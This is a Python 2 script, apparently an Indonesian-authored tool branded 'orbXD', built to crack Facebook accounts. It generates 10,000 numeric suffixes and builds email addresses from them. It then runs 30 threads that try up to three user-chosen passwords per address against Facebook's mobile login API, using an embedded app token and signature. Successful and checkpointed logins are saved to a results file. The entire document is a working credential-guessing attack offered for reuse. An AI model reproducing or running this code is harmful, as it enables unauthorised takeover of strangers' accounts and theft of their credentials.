#coding=utf-8

#Open Source Code Syarat? Subrek Channel Gua & Jangan Ganti Bot Follow! Cukup Tambahkan Bot Follow Sajah!

# Ingat Ini Hanya Untuk Contoh Project!. Kalo Mau Recode, Recode Ajah Itung² Buat Latihan Lu

# Kalo Mau Izin, Izin lewat instgrm/email/fb Ajah

# insgrm : https://www.instagram.com/ngemry7
# email  : xgansb@gmail.com
# fb     : https://www.facebook.com/meyrina.setyaningrum


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, orbxd, requests, mechanize

for n in range(10000):
    nm = random.randint(111, 999)
    sys.stdout = open('.txt', 'a')
    print nm
    sys.stdout.flush()

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)

logo = """\033[1;37m
   ______\033[1;91m   __ __ \033[1;37m            __  
  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
 / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32morbXD.\033[1;37m
\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n"""


back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []

def emaileclone():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    try:
        c = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Nama Email  :\x1b[1;92m ')
        k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Domain Email :\x1b[1;92m ')
        pass1 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 1   : \033[1;92m')
        pass2 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 2   : \033[1;92m')
        pass3 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 3   : \033[1;92m')
        print("\033[0;96m"+50*"-")
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Your Network Dependent Process!!!'
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type CTRL + Z To Stop Crack\x1b[1;37m'
        print("\033[0;96m"+50*"-")
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] File Not Found'
        raw_input('\n [BACK]')
        exit(orbxd.menu())

    xxx = str(len(id))
    psb('\x1b[0;97m [\x1b[1;36m•\x1b[1;37m] Total Crack : ' + xxx)
    psb('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] START CRACK...')
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account Email saved to : email/hasil.txt'
    print("\033[0;96m"+50*"-")

    def main(arg):
        user = arg

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print ' \033[1;92m[OK] \033[1;37m' + c + user + k + '|' + pass1
                okb = open('email/hasil.txt', 'a')
                okb.write(' [OK] ' + c + user + k + '|' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print ' \033[1;93m[CP] \033[1;37m' + c + user + k + '|' + pass1
                cps = open('email/hasil.txt', 'a')
                cps.write(' [CP] ' + c + user + k + '|' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print ' \033[1;92m[OK] \033[1;37m' + c + user + k + '|' + pass2
                    okb = open('email/hasil.txt', 'a')
                    okb.write(' [OK] ' + c + user + k + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print ' \033[1;93m[CP] \033[1;37m' + c + user + k + '|' + pass2
                    cps = open('email/hasil.txt', 'a')
                    cps.write(' [CP] ' + c + user + k + '|' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print ' \033[1;92m[OK] \033[1;37m' + c + user + k + '|' + pass3
                        okb = open('email/hasil.txt', 'a')
                        okb.write(' [OK] ' + c + user + k + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print ' \033[1;93m[CP] \033[1;37m' + c + user + k + '|' + pass3
                        cps = open('email/hasil.txt', 'a')
                        cps.write(' [CP] ' + c + user + k + '|' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    
                    
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] CRACKER Completed ...'
    raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Press Enter Go Back To Menu \x1b[1;97m')
    exit(orbxd.menu())
    
if __name__=="__main__":
    emaileclone()